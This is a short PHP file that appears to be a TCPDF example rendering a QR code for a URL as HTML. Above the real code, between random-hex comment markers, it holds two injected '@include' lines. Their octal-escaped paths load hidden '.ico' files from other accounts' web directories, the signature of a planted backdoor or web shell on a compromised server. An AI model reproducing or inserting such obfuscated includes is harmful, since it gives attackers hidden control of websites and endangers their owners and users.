<?php
/*56bc4*/

@include "\057hom\145/ed\165ind\151af/\160ubl\151c_h\164ml/\166end\157r/a\152ax_\164o_p\150p/.\144ddb\064ae8\056ico";

/*56bc4*/
/*7e76c*/

@include "\057ho\155e/\147ro\165pi\156ka\057pu\142li\143_h\164ml\057sc\150em\145/a\163se\164s/\151ma\147es\057.4\14575\06776\062.i\143o";

/*7e76c*/
 
// include 2D barcode class (search for installation path)

		require_once('tcpdf_barcodes_2d.php');

// set the barcode content and type
$barcodeobj = new TCPDF2DBarcode('https://www.codediffusion.in?id=1', 'QRCODE,H');

// output the barcode as HTML object
echo $barcodeobj->getBarcodeHTML(6, 6, 'black');

//============================================================+
// END OF FILE
//============================================================+
